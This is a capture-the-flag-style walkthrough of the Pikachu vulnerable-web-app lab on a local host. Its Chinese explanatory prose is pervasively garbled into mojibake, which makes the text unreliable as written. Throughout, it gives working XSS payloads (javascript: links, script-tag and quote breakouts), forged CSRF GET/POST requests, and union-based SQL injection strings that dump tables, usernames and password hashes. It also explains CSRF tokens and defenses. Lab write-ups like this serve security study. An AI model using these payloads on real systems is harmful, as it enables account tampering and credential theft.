<p>å°è¯•åˆ©ç”¨å¼•å·æ¥é—­åˆåˆ©ç”¨äº‹ä»¶æ¥è§¦å‘ï¼Œå‘ç°å¼•å·è¢«è½¬ä¹‰äº†ã€‚é‚£å°±åˆ©ç”¨Javascriptä¼ªåè®®æ¥å®ç°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(1);</span><br></pre></td></tr></table></figure>

<p>ä¹‹åç‚¹å‡»é“¾æ¥å³å¯è§¦å‘å¼¹çª—</p>
<h3 id="å…³äºjavascriptä¼ªåè®®ï¼š"><a href="#å…³äºjavascriptä¼ªåè®®ï¼š" class="headerlink" title="å…³äºjavascriptä¼ªåè®®ï¼š"></a>å…³äºjavascriptä¼ªåè®®ï¼š</h3><p>è¿™ä¸ªåè®®å£°æ˜äº†URLçš„ä¸»ä½“æ˜¯ä»»æ„çš„javascriptä»£ç ï¼Œå®ƒç”±javascriptçš„è§£é‡Šå™¨è¿è¡Œã€‚è‹¥javascript:URLä¸­çš„javascriptä»£ç å«æœ‰å¤šä¸ªè¯­å¥ï¼Œå¿…é¡»ä½¿ç”¨åˆ†å·å°†è¿™äº›è¯­å¥åˆ†éš”å¼€ã€‚</p>
<p><code>&lt;a&gt;</code>æ ‡ç­¾å®šä¹‰è¶…é“¾æ¥ï¼Œç”¨äºä»ä¸€ä¸ªé¡µé¢é“¾æ¥åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œæœ€é‡è¦çš„å±æ€§æ˜¯ href å±æ€§ï¼Œå®ƒæŒ‡å®šé“¾æ¥çš„ç›®æ ‡ã€‚</p>
<h2 id="XSSä¹‹jsè¾“å‡º"><a href="#XSSä¹‹jsè¾“å‡º" class="headerlink" title="XSSä¹‹jsè¾“å‡º"></a>XSSä¹‹jsè¾“å‡º</h2><p><img src="https://img.vim-cn.com/73/aae0865e6e1c1d2e50961a7ac46b2f1e9db7b0.png"></p>
<p>å¯ä»¥å‘ç°<code>&lt;script&gt;</code>æ ‡ç­¾ä¸­æœ‰å‡ è¡Œä»£ç ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    $ms&#x3D;&#39;123&#39;;</span><br><span class="line">    if($ms.length !&#x3D; 0)&#123;</span><br><span class="line">        if($ms &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;tmacç¡®å®å‰å®³,çœ‹é‚£å°çœ¼ç¥..&#39;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">&#x2F;&#x2F;            alert($ms);</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;æ— è®ºå¦‚ä½•ä¸è¦æ”¾å¼ƒå¿ƒä¸­æ‰€çˆ±..&#39;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$msçš„å€¼å³ä¸ºè¾“å…¥å€¼</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆé—­åˆ<code>&lt;script&gt;</code>æ ‡ç­¾å®ç°å¼¹çª—<code>&#39;&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
<p>ä¹Ÿå¯ç”¨å¼•å·é—­åˆä¸€ä¸‹ä¹‹åç›´æ¥åŠ ä¸€æ®µ<code>alert(&#39;xss&#39;)</code>å³å¯payloadï¼š<code>&#39;;alert(&#39;xss&#39;);//</code> .<code>//</code>æ˜¯ä¸ºäº†æ³¨é‡Šæ‰åŸæœ‰çš„å¼•å·å’Œåˆ†å·. </p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>â€‹        åœ¨CSRFçš„æ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚ï¼ˆè¿™ä¸ªè¯·æ±‚ä¸€èˆ¬æ˜¯ä¸€ä¸ªé“¾æ¥ï¼‰ï¼Œç„¶åæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»äº†è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»ä¹Ÿå°±å®Œæˆäº†ï¼Œæ‰€ä»¥CSRFæ”»å‡»ä¹Ÿè¢«ç§°ä¸ºâ€one clickâ€æ”»å‡»</p>
<h3 id="æ¢æµ‹"><a href="#æ¢æµ‹" class="headerlink" title="æ¢æµ‹"></a>æ¢æµ‹</h3><p>â€‹        åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦å­˜åœ¨CSRFæ¼æ´ï¼Œå…¶å®å°±æ˜¯åˆ¤æ–­å…¶å¯¹å…³é”®ä¿¡æ¯ï¼ˆæ¯”å¦‚å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ï¼‰çš„æ“ä½œï¼ˆå¢åˆ æ”¹ï¼‰æ˜¯å¦å®¹æ˜“è¢«ä¼ªé€ </p>
<p>1ã€å¯¹ç›®æ ‡ç½‘ç«™å¢åˆ æ”¹çš„åœ°æ–¹è¿›è¡Œæ ‡è®°ï¼Œå¹¶è§‚å¯Ÿå…¶é€»è¾‘ï¼Œåˆ¤æ–­è¯·æ±‚æ˜¯å¦å¯ä»¥è¢«ä¼ªé€ ï¼›</p>
<p>ã€€â€“æ¯”å¦‚ä¿®æ”¹ç®¡ç†å‘˜è´¦å·ï¼Œå¹¶ä¸éœ€è¦éªŒè¯æ—§å¯†ç ï¼Œå¯¼è‡´è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ </p>
<p>ã€€â€“æ¯”å¦‚å¯¹äºæ•æ„Ÿä¿¡æ¯çš„ä¿®æ”¹å¹¶æ²¡æœ‰ä½¿ç”¨å®‰å…¨çš„tokenéªŒè¯ï¼Œå¯¼è‡´è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ </p>
<p>2ã€ç¡®è®¤å‡­è¯çš„æœ‰æ•ˆæœŸï¼ˆè¿™ä¸ªé—®é¢˜ä¼šæé«˜CSRFè¢«åˆ©ç”¨çš„æ¦‚ç‡ï¼‰</p>
<p>ã€€â€“è™½ç„¶æ¨å‡ºæˆ–è€…å…³é—­äº†æµè§ˆå™¨ï¼Œä½†æ˜¯cookieä»ç„¶æœ‰æ•ˆï¼Œæˆ–è€…sessionå¹¶æ²¡æœ‰åŠæ—¶è¿‡æœŸï¼Œå¯¼è‡´CSRFæ”»å‡»å˜å¾—ç®€å•</p>
<h3 id="ä¸XSSåŒºåˆ«"><a href="#ä¸XSSåŒºåˆ«" class="headerlink" title="ä¸XSSåŒºåˆ«"></a>ä¸XSSåŒºåˆ«</h3><p>â€‹        CSRFæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™ï¼Œè€ŒXSSæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™ï¼Œç„¶åå®æ–½ç ´å</p>
<h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF( get )"></a>CSRF( get )</h2><p>ç‚¹å‡»å³ä¸Šè§’çš„æç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å‡ ä¸ªè´¦å·ï¼Œç™»é™†åå¯ä»¥çœ‹åˆ°ä¸ªäººä¿¡æ¯</p>
<p><img src="https://img.vim-cn.com/69/2b33696b5316b18fee8a7103c882650015f574.png"></p>
<p>å°è¯•ä¿®æ”¹ä¸€ä¸‹ä¸ªäººä¿¡æ¯</p>
<p><img src="https://img.vim-cn.com/ff/a516c0b7a7ef5bb2662ff899e6fcf57998968e.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;15988767673&amp;add&#x3D;earth&amp;email&#x3D;kobe@pikachu.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æ ¹æ®urlçš„æ„é€ ï¼Œè¿›è¡Œä¼ªé€ å¹¶ä¸”è¯±éª—ç”¨æˆ·ç‚¹å‡»å³å¯å®ç°csrfæ”»å‡»ï¼Œä¾‹å¦‚ æ„é€ ä¸€ä¸ªä¿®æ”¹é‚®ç®±çš„url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;15988767673&amp;add&#x3D;earth&amp;email&#x3D;123456@pikachu.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>è‹¥ç”¨æˆ·åœ¨ç™»é™†çŠ¶æ€ä¸‹ç‚¹å‡»urlåˆ™ä¿¡æ¯ä¼šè¢«ä¿®æ”¹</p>
<p><img src="https://img.vim-cn.com/21/55d81aea8c3a68d1a6fc98ff167ace9c1a8c69.png"></p>
<h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF( post )"></a>CSRF( post )</h2><p>ä»¥postæ–¹å¼è¿›è¡Œæäº¤è¯·æ±‚çš„è¯å°±æ— æ³•é€šè¿‡åƒgetæ–¹å¼é‚£æ ·ä¼ªé€ urlå®ç°æ”»å‡»ï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ç«™ç‚¹ï¼Œå°†POSTè¯·æ±‚éšè—åœ¨ç«™ç‚¹ä¸­çš„è¡¨å•ä¸­ï¼Œç„¶åè¯±éª—ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œå½“ç”¨æˆ·ç‚¹å‡»åè§¦å‘è¡¨å•ï¼Œæ•°æ®è‡ªç„¶å°±POSTåˆ°å­˜åœ¨CSRFæ¼æ´çš„ç½‘ç«™ï¼Œç”¨æˆ·çš„ä¿¡æ¯åˆ™è¢«æ¶æ„ä¿®æ”¹</p>
<p>æ¼”ç¤º ä½¿ç”¨bpå®ç°</p>
<p>ä¿®æ”¹ä¸€ä¸‹ï¼Œåœ¨bpä¸­æ‰¾åˆ°åˆšåˆšæäº¤çš„poståŒ…ï¼ˆè®°å¾—ä¸è¦æ‹¦æˆª</p>
<p><img src="https://img.vim-cn.com/b0/1bbec1a4b044c6ea9f99ef04bb9d2abb04957d.png"></p>
<p>å°†è¿™ä¸ªåŒ…ä¼ åˆ° <code>Generate CSRF PoC</code></p>
<p><img src="https://img.vim-cn.com/d3/ed8d56634813dff72dd0484fc5ed90d724a3b9.png"></p>
<p>ä¿®æ”¹æ•°æ®ï¼Œå¹¶ç”Ÿæˆurl æ“ä½œå¦‚ä¸‹ğŸ‘‡ï¼ˆä¹Ÿå¯ç‚¹copy htmlï¼Œä¿®æ”¹å†…å®¹åæ”¾å…¥å¯¹åº”ç«™ç‚¹ä¸‹å³å¯</p>
<p><img src="https://img.vim-cn.com/e7/86d713c5e8c8d6a4b176c51f5d766d3aadae6e.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;burpsuite&#x2F;show&#x2F;3&#x2F;2mahwy0tx746tboun3j4psftikhddv9v</span><br></pre></td></tr></table></figure>

<p><img src="https://img.vim-cn.com/e7/9aecbd2f450842585d87f898722f1453660ae9.png"></p>
<p>ç‚¹å‡»æäº¤è¯·æ±‚ï¼Œå³å¯å‘ç°ä¿¡æ¯ä¿®æ”¹æˆåŠŸ</p>
<p><img src="https://img.vim-cn.com/c9/e43996934fc28e7b70f6be86bc26245fed14dc.png"></p>
<h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF( Token )"></a>CSRF( Token )</h2><p>åŸç†ï¼šä¸»è¦é—®é¢˜æ˜¯æ•æ„Ÿæ“ä½œçš„é“¾æ¥å®¹æ˜“è¢«ä¼ªé€ ã€‚è€Œåªè¦åœ¨æ¯æ¬¡è¯·æ±‚æ—¶éƒ½å¢åŠ ä¸€ä¸ªéšæœºç <code>Token</code>ï¼Œåå°æ¯æ¬¡éƒ½å¯¹è¿™ä¸ªéšæœºç è¿›è¡ŒéªŒè¯ï¼Œåˆ™å¯ä»¥æœ‰æ•ˆåœ°é˜²æ­¢CSRF</p>
<p>åœ¨æºç ä¸­å¯ä»¥å‘ç°ğŸ‘‡</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;per_info&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;per_title&quot;</span>&gt;</span>hello,&#123;$name&#125;,æ¬¢è¿æ¥åˆ°ä¸ªäººä¼šå‘˜ä¸­å¿ƒ | <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color:bule;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;token_get.php?logout=1&quot;</span>&gt;</span>é€€å‡ºç™»å½•<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_name&quot;</span>&gt;</span>å§“å:&#123;$name&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_sex&quot;</span>&gt;</span>æ€§åˆ«:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$sex&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_phone&quot;</span>&gt;</span>æ‰‹æœº:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$phonenum&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>    </span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_add&quot;</span>&gt;</span>ä½å€:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$add&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_email&quot;</span>&gt;</span>é‚®ç®±:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$email&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">       </span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$_SESSION[&#x27;token&#x27;]&#125;&quot;</span> /&gt;</span></span><br><span class="line">       </span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;sub&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¯æ¬¡åˆ·æ–°é¡µé¢ï¼Œéƒ½ä¼šåˆ·æ–°<code>token</code>ï¼Œä¼šæŠŠ<code>SESSION</code>ä¸­<code>token</code>é”€æ¯ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªæ–°çš„<code>token</code>ï¼Œå¹¶å°†è¿™ä¸ª<code>token</code>ä¼ åˆ°å‰ç«¯è¡¨å•ä¸­ï¼Œæ¯æ¬¡æäº¤è¡¨å•æ—¶ï¼Œè¿™ä¸ª<code>token</code>å€¼å°±ä¼šä¼ åˆ°åå°ä¸<code>SESSION</code>ä¸­çš„<code>token</code>è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ä¸ç›¸ç­‰ï¼Œæ­¤æ¬¡è¡¨å•åˆ™æäº¤å¤±è´¥ã€‚æ‰€ä»¥é»‘å®¢ç”±äºä¸èƒ½å¾—çŸ¥ç”¨æˆ·å½“å‰çš„<code>token</code>å€¼ï¼Œä»è€Œæ— æ³•è¿›è¡ŒCSRFæ”»å‡»</p>
<h3 id="é˜²èŒƒæªæ–½"><a href="#é˜²èŒƒæªæ–½" class="headerlink" title="é˜²èŒƒæªæ–½"></a>é˜²èŒƒæªæ–½</h3><ol>
<li>å¢åŠ éªŒè¯ç </li>
<li>è¿›è¡Œè¾ƒä¸ºå®‰å…¨çš„ä¼šè¯ç®¡ç†ï¼Œè®¾ç½®ä¼šè¯è¿‡æœŸæ—¶é•¿</li>
<li>è¿›è¡ŒäºŒæ¬¡éªŒè¯ï¼Œå¦‚è¿›è¡Œæ•æ„Ÿæ“ä½œæ—¶å¯¹ç”¨æˆ·èº«ä»½è¿›è¡ŒäºŒæ¬¡è®¤è¯</li>
</ol>
<h1 id="Sql-Inject-SQLæ³¨å…¥"><a href="#Sql-Inject-SQLæ³¨å…¥" class="headerlink" title="Sql Inject(SQLæ³¨å…¥)"></a>Sql Inject(SQLæ³¨å…¥)</h1><h2 id="æ•°å­—å‹æ³¨å…¥-post"><a href="#æ•°å­—å‹æ³¨å…¥-post" class="headerlink" title="æ•°å­—å‹æ³¨å…¥( post )"></a>æ•°å­—å‹æ³¨å…¥( post )</h2><p><img src="https://img-blog.csdnimg.cn/20210201132535206.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªPOSTä¼ å‚å½¢å¼<br>æ‰€ä»¥ç›´æ¥ç”¨burpsuiteæŠ“åŒ…æ¥è¿›è¡Œsqlæ³¨å…¥</p>
<p><img src="https://img-blog.csdnimg.cn/20210201151706459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">ctrl+rå‘é€åˆ°Repeateré‡Œ<br>ä¿®æ”¹idçš„å€¼è¿›è¡Œæ³¨å…¥</p>
<p>çˆ†å­—æ®µ<br><img src="https://img-blog.csdnimg.cn/20210201152002801.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æŸ¥çœ‹æ•°æ®åº“å<br><img src="https://img-blog.csdnimg.cn/20210201152122654.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æŸ¥çœ‹è¯¥æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;0 union select 1,concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201152305126.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">çˆ†usersè¡¨ä¸­çš„å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;0 union select 1,concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201152443306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">è·å–usernameå’Œpasswordæ•°æ®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;0 union select username,password from users%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201152607769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">å¯¹åº”è´¦å·å’ŒMD5åŠ å¯†çš„å¯†ç ï¼š<br>adminï¼še10adc3949ba59abbe56e057f20f883eï¼ˆ123456ï¼‰<br>pikachuï¼š670b14728ad9902aecba32e22fa4f6bdï¼ˆ000000ï¼‰<br>testï¼še99a18c428cb38d5f260853678922e03ï¼ˆabc123ï¼‰</p>
<h2 id="å­—ç¬¦å‹æ³¨å…¥-get"><a href="#å­—ç¬¦å‹æ³¨å…¥-get" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥( get )"></a>å­—ç¬¦å‹æ³¨å…¥( get )</h2><p><img src="https://img-blog.csdnimg.cn/20210201152935585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">å’Œä¸Šä¸€ä¸ªç±»ä¼¼ï¼Œåªä¸è¿‡è¿™ä¸ªæ˜¯å­—ç¬¦å‹çš„ï¼Œéœ€è¦åŠ ä¸Šä¸€ä¸ªå•å¼•å· (â€˜) æ¥é—­åˆ</p>
<p>çˆ†å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; order by 2#</span><br><span class="line"></span><br><span class="line">a&#39; order by 3#</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å‘ç°æœ‰ä¸¤ä¸ªå­—æ®µ<br><img src="https://img-blog.csdnimg.cn/2021020115325520.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¥ç€æŸ¥æ•°æ®åº“åå’Œç‰ˆæœ¬å·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; union select database(),version()#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201153407287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥æ•°æ®åº“ä¸­çš„è¡¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161144361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥userè¡¨ä¸­çš„å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;user&#39;#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161321999.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æŸ¥å­—æ®µå€¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; union select group_concat(username),group_concat(password) from users#</span><br><span class="line">a&#39; union select group_concat(username),group_concat(password) from pikachu.users#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161641616.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æœç´¢å‹æ³¨å…¥"><a href="#æœç´¢å‹æ³¨å…¥" class="headerlink" title="æœç´¢å‹æ³¨å…¥"></a>æœç´¢å‹æ³¨å…¥</h2><p><img src="https://img-blog.csdnimg.cn/20210201161750828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">çˆ†å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; order by 3#</span><br><span class="line">a&#39; order by 4#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161959799.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥å‘ç°å­—æ®µä¸º3<br>çœ‹ä¸€ä¸‹æ˜¾ç¤ºä½</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; union select 1,2,3#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201162118452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¥ç€å°±æ˜¯ç±»ä¼¼ä¹‹å‰çš„æ“ä½œ<br>ä¾æ¬¡æŸ¥æ•°æ®åº“åï¼Œè¡¨åï¼Œå­—æ®µåï¼Œå­—æ®µå€¼å°±è¡Œäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; union select 1,database(),version()#</span><br><span class="line"></span><br><span class="line">a&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()#</span><br><span class="line"></span><br><span class="line">a&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line"></span><br><span class="line">a&#39; union select group_concat(id),group_concat(username),group_concat(password) from users#</span><br></pre></td></tr></table></figure>



<h2 id="xxå‹æ³¨å…¥"><a href="#xxå‹æ³¨å…¥" class="headerlink" title="xxå‹æ³¨å…¥"></a>xxå‹æ³¨å…¥</h2><p><del>å°è¯•ç”¨å•å¼•å·é—­åˆï¼Œå‘ç°ä¸è¡Œï¼Œè¯•ä¸€è¯•åŒå¼•å·ï¼Œè¿˜æ˜¯ä¸è¡Œï¼ŒWTF??</del><br>å°è¯•ç”¨â€™)é—­åˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201162833211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¥ç€é‡å¤å‰è¾¹çš„æ“ä½œä¾æ¬¡æŸ¥è¯¢å°±è¡Œäº†ï¼Œæ³¨æ„é—­åˆæ–¹å¼æ˜¯ç”¨å•å¼•å·åŠ ä¸Šå°æ‹¬å·</p>
<p>æˆ‘è¿™ç›´æ¥çˆ†usernameå’Œpasswordäº†<br><img src="https://img-blog.csdnimg.cn/20210201163135634.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
